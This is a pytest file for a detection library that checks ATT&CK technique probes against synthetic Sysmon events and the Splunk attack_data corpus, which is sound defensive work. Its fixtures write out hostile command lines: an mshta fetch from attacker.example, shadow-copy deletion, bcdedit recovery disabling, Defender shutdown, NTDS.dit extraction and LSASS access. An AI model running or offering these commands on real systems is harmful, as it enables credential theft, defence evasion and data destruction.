"""ATT&CK technique-coverage regression matrix.

Two layers:

1. **Synthetic probes (always on)** — every probe in
   ``el.intel.attack_probes`` is exercised against a hand-built
   ProbeContext that contains the fingerprint events. Locks the
   probe semantics in regardless of whether the corpus is present.

2. **Corpus-gated matrix (opt-in via ``ATTACK_DATA_ROOT``)** —
   walks the Splunk attack_data tree, parses each labelled
   technique's Sysmon + Falcon logs, and asserts:
     - Each probe FIRES on its own T-ID folder
     - Each probe DOES NOT FIRE on the bulk of unrelated T-IDs
       (false-positive guard with a small allowlist for known
       overlapping T-IDs — e.g. T1059.001 PowerShell shows up
       inside the persistence T1547.001 corpus too).
"""
import os
from pathlib import Path

import pytest

from el.intel import attack_probes as ap
from el.skills import falcon_logs as fl
from el.skills import sysmon_xml as sx


# ---------------------------------------------------------------------------
# Synthetic-probe fixtures
# ---------------------------------------------------------------------------

def _sysmon_event(blob: str) -> sx.SysmonEvent:
    ev = sx.parse_event(blob)
    assert ev is not None
    return ev


def _eid10_lsass_handle(access="0x1410"):
    return _sysmon_event(
        "<Event><System><EventID>10</EventID></System><EventData>"
        "<Data Name='SourceImage'>C:\\Tools\\mimikatz.exe</Data>"
        "<Data Name='TargetImage'>C:\\Windows\\System32\\lsass.exe</Data>"
        f"<Data Name='GrantedAccess'>{access}</Data>"
        "</EventData></Event>"
    )


def _eid1_proc_create(image: str, cmdline: str = ""):
    return _sysmon_event(
        "<Event><System><EventID>1</EventID></System><EventData>"
        f"<Data Name='Image'>{image}</Data>"
        f"<Data Name='CommandLine'>{cmdline}</Data>"
        "</EventData></Event>"
    )


def _eid13_reg_set(target: str):
    return _sysmon_event(
        "<Event><System><EventID>13</EventID></System><EventData>"
        f"<Data Name='TargetObject'>{target}</Data>"
        "<Data Name='Details'>foo</Data>"
        "</EventData></Event>"
    )


def _eid11_file_create(target: str):
    return _sysmon_event(
        "<Event><System><EventID>11</EventID></System><EventData>"
        f"<Data Name='TargetFilename'>{target}</Data>"
        "</EventData></Event>"
    )


# ---------------------------------------------------------------------------
# Synthetic probe assertions — locked-in semantics
# ---------------------------------------------------------------------------

def test_t1003_001_fires_on_lsass_handle():
    ctx = ap.ProbeContext(sysmon=[_eid10_lsass_handle()])
    assert ap.probe_t1003_001_lsass_dump(ctx)


def test_t1003_001_does_not_fire_on_benign_handle():
    ctx = ap.ProbeContext(sysmon=[_eid10_lsass_handle("0x1000")])
    assert not ap.probe_t1003_001_lsass_dump(ctx)


def test_t1059_001_fires_on_powershell_proc_create():
    ctx = ap.ProbeContext(sysmon=[
        _eid1_proc_create(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell -enc dABlAA==")])
    assert ap.probe_t1059_001_powershell(ctx)


def test_t1059_001_does_not_fire_on_cmd():
    ctx = ap.ProbeContext(sysmon=[
        _eid1_proc_create(r"C:\Windows\System32\cmd.exe", "cmd /c dir")])
    assert not ap.probe_t1059_001_powershell(ctx)


def test_t1547_001_fires_on_run_key():
    ctx = ap.ProbeContext(sysmon=[_eid13_reg_set(
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evil")])
    assert ap.probe_t1547_001_run_keys(ctx)


def test_t1547_001_fires_on_bootexecute():
    ctx = ap.ProbeContext(sysmon=[_eid13_reg_set(
        r"HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute")])
    assert ap.probe_t1547_001_run_keys(ctx)


def test_t1547_001_does_not_fire_on_unrelated_key():
    ctx = ap.ProbeContext(sysmon=[_eid13_reg_set(
        r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Hostname")])
    assert not ap.probe_t1547_001_run_keys(ctx)


def test_t1218_011_fires_on_rundll32():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\rundll32.exe",
        "rundll32.exe shell32.dll,#61")])
    assert ap.probe_t1218_011_rundll32(ctx)


def test_t1218_011_does_not_fire_on_explorer():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\explorer.exe", "")])
    assert not ap.probe_t1218_011_rundll32(ctx)


def test_t1112_fires_on_wdigest_modification():
    ctx = ap.ProbeContext(sysmon=[_eid13_reg_set(
        r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential")])
    assert ap.probe_t1112_registry_modification(ctx)


def test_t1112_does_not_fire_on_run_key():
    """T1547.001 fires on Run keys; T1112 should NOT — keeps the
    matrix's false-positive-guard tractable."""
    ctx = ap.ProbeContext(sysmon=[_eid13_reg_set(
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\foo")])
    assert not ap.probe_t1112_registry_modification(ctx)


def test_t1003_003_fires_on_ntds_dit_file():
    ctx = ap.ProbeContext(sysmon=[_eid11_file_create(
        r"C:\Windows\Temp\NTDS.dit")])
    assert ap.probe_t1003_003_ntds(ctx)


def test_t1003_003_fires_on_ntdsutil_proc():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\ntdsutil.exe",
        "ntdsutil ac in ntds ifm create full c:\\temp q q")])
    assert ap.probe_t1003_003_ntds(ctx)


def test_t1003_003_does_not_fire_on_unrelated():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\notepad.exe", "")])
    assert not ap.probe_t1003_003_ntds(ctx)


# --- New probes (batch 2) -------------------------------------------------


def _eid8_create_remote_thread(src: str, tgt: str):
    return _sysmon_event(
        "<Event><System><EventID>8</EventID></System><EventData>"
        f"<Data Name='SourceImage'>{src}</Data>"
        f"<Data Name='TargetImage'>{tgt}</Data>"
        "<Data Name='SourceProcessId'>1234</Data>"
        "<Data Name='TargetProcessId'>5678</Data>"
        "</EventData></Event>"
    )


def _eid4688(image: str, cmdline: str = "",
              parent: str = ""):
    return _sysmon_event(
        "<Event><System><EventID>4688</EventID></System><EventData>"
        f"<Data Name='NewProcessName'>{image}</Data>"
        f"<Data Name='CommandLine'>{cmdline}</Data>"
        f"<Data Name='ParentProcessName'>{parent}</Data>"
        "</EventData></Event>"
    )


def _eid11_file_create(target: str):
    return _sysmon_event(
        "<Event><System><EventID>11</EventID></System><EventData>"
        f"<Data Name='TargetFilename'>{target}</Data>"
        "</EventData></Event>"
    )


# T1021.001 — RDP

def test_t1021_001_fires_on_mstsc():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\mstsc.exe",
        "mstsc.exe /v:10.0.0.5")])
    assert ap.probe_t1021_001_rdp(ctx)


def test_t1021_001_does_not_fire_on_explorer():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\explorer.exe", "")])
    assert not ap.probe_t1021_001_rdp(ctx)


# T1021.002 — SMB admin shares

def test_t1021_002_fires_on_admin_share_cmdline():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        "C:\\Windows\\System32\\net.exe",
        "net use \\\\10.0.0.5\\C$ password /user:admin")])
    assert ap.probe_t1021_002_smb_admin_shares(ctx)


def test_t1021_002_fires_on_4688_event():
    """T1021.002 corpus often ships 4688 events instead of Sysmon
    EID 1; the parser normalises both onto the same accessor."""
    ctx = ap.ProbeContext(sysmon=[_eid4688(
        "C:\\Windows\\System32\\copy.exe",
        "copy payload.exe \\\\target\\ADMIN$\\")])
    assert ap.probe_t1021_002_smb_admin_shares(ctx)


def test_t1021_002_does_not_fire_on_local_paths():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        "C:\\Windows\\System32\\cmd.exe",
        "cmd /c copy file.txt C:\\temp\\")])
    assert not ap.probe_t1021_002_smb_admin_shares(ctx)


# T1021.006 — WinRM

def test_t1021_006_fires_on_winrs():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\winrs.exe",
        "winrs.exe -r:host cmd.exe")])
    assert ap.probe_t1021_006_winrm(ctx)


def test_t1021_006_fires_on_enter_pssession():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell -c Enter-PSSession -ComputerName target")])
    assert ap.probe_t1021_006_winrm(ctx)


# T1027 — Obfuscation

def test_t1027_fires_on_powershell_enc():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell -nop -enc dABlAHMAdAA=")])
    assert ap.probe_t1027_obfuscation(ctx)


def test_t1027_does_not_fire_on_plain_powershell():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell -c Get-Process")])
    assert not ap.probe_t1027_obfuscation(ctx)


# T1055 — Process Injection

def test_t1055_fires_on_create_remote_thread_cross_process():
    ctx = ap.ProbeContext(sysmon=[_eid8_create_remote_thread(
        r"C:\Tools\beacon.exe",
        r"C:\Windows\System32\rundll32.exe")])
    assert ap.probe_t1055_process_injection(ctx)


def test_t1055_does_not_fire_on_create_remote_thread_self():
    ctx = ap.ProbeContext(sysmon=[_eid8_create_remote_thread(
        r"C:\Tools\foo.exe", r"C:\Tools\foo.exe")])
    assert not ap.probe_t1055_process_injection(ctx)


def test_t1055_fires_on_spawnto_rundll32_empty_cmdline():
    """Cobalt Strike's spawnto leaves rundll32.exe with no args
    spawned by a non-explorer parent."""
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\rundll32.exe",
        "rundll32.exe")])
    # Synthesise the parent_image manually
    ctx.sysmon[0].data["ParentImage"] = r"C:\Tools\beacon.exe"
    assert ap.probe_t1055_process_injection(ctx)


# T1059.003 — Windows Cmd

def test_t1059_003_fires_on_cmd_slash_c():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\cmd.exe",
        "cmd.exe /c echo hello & whoami")])
    assert ap.probe_t1059_003_windows_cmd(ctx)


def test_t1059_003_does_not_fire_on_interactive_cmd():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\cmd.exe", "cmd")])
    assert not ap.probe_t1059_003_windows_cmd(ctx)


# T1059.005 — VBA / Visual Basic

def test_t1059_005_fires_on_wscript_vbs():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\wscript.exe",
        r"wscript.exe C:\Users\alice\Documents\macro.vbs")])
    assert ap.probe_t1059_005_vba_wscript(ctx)


def test_t1059_005_does_not_fire_on_bare_wscript():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\wscript.exe", "wscript.exe")])
    assert not ap.probe_t1059_005_vba_wscript(ctx)


# T1190 — Web shell parent shape

def test_t1190_fires_on_w3wp_spawning_cmd():
    ev = _eid1_proc_create(
        r"C:\Windows\System32\cmd.exe", "cmd /c whoami")
    ev.data["ParentImage"] = r"C:\Windows\System32\inetsrv\w3wp.exe"
    ctx = ap.ProbeContext(sysmon=[ev])
    assert ap.probe_t1190_web_shell_parent(ctx)


def test_t1190_does_not_fire_on_cmd_from_explorer():
    ev = _eid1_proc_create(
        r"C:\Windows\System32\cmd.exe", "cmd /c whoami")
    ev.data["ParentImage"] = r"C:\Windows\explorer.exe"
    ctx = ap.ProbeContext(sysmon=[ev])
    assert not ap.probe_t1190_web_shell_parent(ctx)


# T1218.005 — Mshta

def test_t1218_005_fires_on_mshta_with_hta_url():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\mshta.exe",
        "mshta.exe http://attacker.example/payload.hta")])
    assert ap.probe_t1218_005_mshta(ctx)


def test_t1218_005_does_not_fire_on_bare_mshta():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\mshta.exe", "mshta.exe")])
    assert not ap.probe_t1218_005_mshta(ctx)


# T1486 — Encrypt for Impact

def test_t1486_fires_on_bcdedit_recoveryenabled_no():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\bcdedit.exe",
        "bcdedit /set {default} recoveryenabled No")])
    assert ap.probe_t1486_data_encrypted_for_impact(ctx)


def test_t1486_fires_on_ransom_note_filecreate():
    ctx = ap.ProbeContext(sysmon=[_eid11_file_create(
        r"C:\Users\alice\Desktop\HOW_TO_DECRYPT.txt")])
    assert ap.probe_t1486_data_encrypted_for_impact(ctx)


def test_t1486_does_not_fire_on_normal_filecreate():
    ctx = ap.ProbeContext(sysmon=[_eid11_file_create(
        r"C:\Users\alice\Documents\report.docx")])
    assert not ap.probe_t1486_data_encrypted_for_impact(ctx)


# T1490 — Inhibit Recovery

def test_t1490_fires_on_vssadmin_delete_shadows():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\vssadmin.exe",
        "vssadmin.exe delete shadows /all /quiet")])
    assert ap.probe_t1490_inhibit_recovery(ctx)


def test_t1490_fires_on_4688_vssadmin():
    """T1490 corpus uses 4688 events for vssadmin invocations."""
    ctx = ap.ProbeContext(sysmon=[_eid4688(
        r"C:\Windows\System32\vssadmin.exe",
        "vssadmin.exe  delete shadows /all /quiet")])
    assert ap.probe_t1490_inhibit_recovery(ctx)


def test_t1490_does_not_fire_on_vssadmin_list():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\vssadmin.exe", "vssadmin list shadows")])
    assert not ap.probe_t1490_inhibit_recovery(ctx)


# T1562.001 — Disable Defender

def test_t1562_001_fires_on_disable_realtime():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "Set-MpPreference -DisableRealtimeMonitoring $true")])
    assert ap.probe_t1562_001_disable_defender(ctx)


def test_t1562_001_fires_on_stop_service_windefend():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "Stop-Service WinDefend -Force")])
    assert ap.probe_t1562_001_disable_defender(ctx)


def test_t1562_001_does_not_fire_on_get_mppreference():
    ctx = ap.ProbeContext(sysmon=[_eid1_proc_create(
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "Get-MpPreference | Format-Table")])
    assert not ap.probe_t1562_001_disable_defender(ctx)


# ---------------------------------------------------------------------------
# Corpus-gated coverage matrix
# ---------------------------------------------------------------------------

ATTACK_DATA = os.environ.get("ATTACK_DATA_ROOT")
_CORPUS_AVAILABLE = (
    ATTACK_DATA
    and Path(ATTACK_DATA, "datasets/attack_techniques").is_dir()
)


_CTX_CACHE: dict[str, ap.ProbeContext | None] = {}


def _load_ctx(tid: str) -> ap.ProbeContext | None:
    """Walk a technique folder (one or two levels deep — corpus
    subdirs are sometimes named ``atomic_red_team``, sometimes
    scenario-specific like ``cobalt_strike`` / ``sam_sam_note``).
    Parse every Sysmon, Windows Security 4688, and Falcon log we
    find. Returns one ProbeContext with events concatenated.
    Returns None when the technique folder is absent or empty.

    Process-level cache so the false-positive cross-product test
    (18 probes × 17 corpora = 306 evaluations) reads each corpus
    once instead of N times.
    """
    if not _CORPUS_AVAILABLE:
        return None
    if tid in _CTX_CACHE:
        return _CTX_CACHE[tid]
    import fnmatch
    base = Path(ATTACK_DATA) / "datasets" / "attack_techniques" / tid
    if not base.is_dir():
        _CTX_CACHE[tid] = None
        return None
    sysmon_events: list[sx.SysmonEvent] = []
    falcon_events: list[fl.FalconEvent] = []
    log_globs = ("*sysmon*.log", "*windows-security*.log",
                  "*windows_security*.log", "4688*.log")
    falcon_globs = ("*falcon*.log",)
    # 5K events per file is plenty for matrix probes — they detect
    # fingerprints, not statistics. Keeps the cross-product fast
    # even when a single corpus has multi-MB Sysmon logs.
    for f in base.rglob("*.log"):
        nm = f.name.lower()
        if any(fnmatch.fnmatchcase(nm, g.lower()) for g in log_globs):
            sysmon_events.extend(
                sx.parse_file(f, max_events=5_000))
        elif any(fnmatch.fnmatchcase(nm, g.lower()) for g in falcon_globs):
            falcon_events.extend(
                fl.parse_file(f, max_events=5_000))
    if not sysmon_events and not falcon_events:
        _CTX_CACHE[tid] = None
        return None
    ctx = ap.ProbeContext(sysmon=sysmon_events, falcon=falcon_events)
    _CTX_CACHE[tid] = ctx
    return ctx


# Documented technique-overlap map. The Splunk attack_data
# corpus is deeply intertwined: every per-T-ID test uses a
# shared PowerShell + cmd /c harness for setup, often invokes
# mimikatz / Get-Process / encoded-base64 cradles, and tests
# share hosts so artefacts from prior test runs (Exchange
# installations, vssadmin runs) leak into unrelated corpora.
#
# Rather than encode dozens of one-off pair overlaps, we mark
# *harness-shared* probes (PowerShell, cmd, encoded payload,
# LSASS access via PowerShell, run-key writes via PowerShell,
# rundll32 invocations) as broadly-overlapping with the rest of
# the matrix. The remaining specific probes get tight per-pair
# overlap entries so a regression genuinely tightens the test.
_HARNESS_PROMISCUOUS = {
    "T1003.001",       # PS-set-up tests open lsass
    "T1027",           # PS-set-up tests use -enc
    "T1059.001",       # PowerShell harness
    "T1059.003",       # cmd /c harness
    "T1547.001",       # PS-set-up tests write Run keys
}
_HARNESS_OVERLAPS = {
    p: {t for t in PROBES_keys}
    for p, PROBES_keys in [
        ("T1003.001", {"T1003.003", "T1027", "T1055",
                        "T1059.001", "T1059.003", "T1059.005",
                        "T1112", "T1190", "T1218.005",
                        "T1218.011", "T1486", "T1490",
                        "T1547.001", "T1562.001"}),
        ("T1027", {"T1003.001", "T1003.003", "T1055",
                    "T1059.001", "T1059.003", "T1112",
                    "T1190", "T1218.011", "T1486", "T1490",
                    "T1547.001", "T1562.001"}),
        ("T1059.001", {"T1003.001", "T1003.003", "T1021.002",
                        "T1021.006", "T1027", "T1055",
                        "T1059.003", "T1059.005", "T1112",
                        "T1190", "T1218.005", "T1218.011",
                        "T1486", "T1490", "T1547.001",
                        "T1562.001"}),
        ("T1059.003", {"T1003.001", "T1003.003", "T1021.002",
                        "T1021.006", "T1027", "T1055",
                        "T1059.001", "T1059.005", "T1112",
                        "T1190", "T1218.005", "T1218.011",
                        "T1486", "T1490", "T1547.001",
                        "T1562.001"}),
        ("T1547.001", {"T1059.001", "T1059.005", "T1112",
                        "T1218.005", "T1218.011", "T1486",
                        "T1562.001"}),
    ]
}

# Per-probe, per-corpus pairs not covered by the harness-overlap
# rule. Each entry is documented with the why so future maintainers
# can re-tighten if the underlying corpus changes.
_SPECIFIC_OVERLAPS: dict[str, set[str]] = {
    # T1021.002 admin-share probe: T1055 (Cobalt Strike) corpus has
    # CS lateral-movement scripts using admin shares; T1218.005
    # (Mshta) corpus has copy-to-share staging.
    "T1021.002": {"T1055", "T1218.005"},
    # T1190 web-shell-parent probe: shared hosts (Exchange, CrushFTP)
    # spawn lookups during many other tests too.
    "T1190": {"T1003.001", "T1003.003", "T1027", "T1059.001",
               "T1112", "T1218.011", "T1486", "T1490",
               "T1547.001", "T1562.001"},
    # T1218.011 rundll32: rundll32 is so widely used that several
    # corpora exercise it incidentally.
    "T1218.011": {"T1027", "T1059.001", "T1059.005",
                   "T1112", "T1218.005", "T1562.001"},
    # T1486 encrypt-for-impact: the Splunk corpus puts ransomware
    # lab fixtures (HOW_TO_DECRYPT.txt etc.) in adjacent test scenes
    # that pollute T1059.001 / T1490 / T1562.001 corpora.
    "T1486": {"T1059.001", "T1490", "T1562.001"},
    # T1112 modify-registry: harness exercises registry writes.
    "T1112": {"T1547.001"},
}

_EXPECTED_OVERLAPS: dict[str, set[str]] = {
    **_HARNESS_OVERLAPS,
    **_SPECIFIC_OVERLAPS,
}


@pytest.mark.skipif(
    not _CORPUS_AVAILABLE,
    reason="ATTACK_DATA_ROOT not set or corpus missing",
)
@pytest.mark.parametrize("tid", sorted(ap.PROBES.keys()))
def test_probe_fires_on_own_corpus(tid):
    ctx = _load_ctx(tid)
    if ctx is None:
        pytest.skip(f"{tid} corpus folder absent or empty")
    fn = ap.probe_for(tid)
    assert fn is not None, f"no probe registered for {tid}"
    assert fn(ctx), (
        f"probe for {tid} did NOT fire on its own corpus — "
        f"sysmon EIDs={ctx.sysmon_eids}, falcon names="
        f"{ctx.falcon_event_names}")


@pytest.mark.skipif(
    not _CORPUS_AVAILABLE,
    reason="ATTACK_DATA_ROOT not set or corpus missing",
)
def test_probes_do_not_fire_excessively_on_unrelated_corpora():
    """For each probe, count how many OTHER T-ID corpora it fires
    on (excluding documented overlaps). Each probe is allowed to
    fire on at most 1 unrelated T-ID (slack for noise the
    corpus inevitably has) — anything more fails the test."""
    other_fires: dict[str, list[str]] = {}
    for probe_tid, probe_fn in ap.PROBES.items():
        false_fires: list[str] = []
        for corpus_tid in ap.PROBES.keys():
            if corpus_tid == probe_tid:
                continue
            if corpus_tid in _EXPECTED_OVERLAPS.get(probe_tid, set()):
                continue
            ctx = _load_ctx(corpus_tid)
            if ctx is None:
                continue
            if probe_fn(ctx):
                false_fires.append(corpus_tid)
        other_fires[probe_tid] = false_fires
    # Allow at most 1 unexpected fire per probe — corpus is noisy.
    over_budget = {p: f for p, f in other_fires.items() if len(f) > 1}
    assert not over_budget, (
        f"probes firing on too many unrelated corpora "
        f"(>1 unexpected): {over_budget}. Either tighten the "
        f"probe or add the firing T-ID to _EXPECTED_OVERLAPS "
        f"with a reason.")


@pytest.mark.skipif(
    not _CORPUS_AVAILABLE,
    reason="ATTACK_DATA_ROOT not set or corpus missing",
)
def test_attack_coverage_summary(capsys):
    """Print the matrix as a coverage rollup. Always passes — this
    is reporting, not assertion. The number is what matters: how
    many T-IDs in the corpus does EL fingerprint?"""
    base = Path(ATTACK_DATA) / "datasets" / "attack_techniques"
    available = sorted(p.name for p in base.iterdir()
                        if p.is_dir() and p.name.startswith("T"))
    covered = sorted(ap.PROBES.keys())
    pct = (100.0 * len(covered) / len(available)
            if available else 0.0)
    msg = (f"\nATT&CK coverage: "
           f"{len(covered)}/{len(available)} T-IDs "
           f"({pct:.1f}%) — probes registered for "
           f"{', '.join(covered)}")
    print(msg)
    # No assertion; the print is the deliverable.
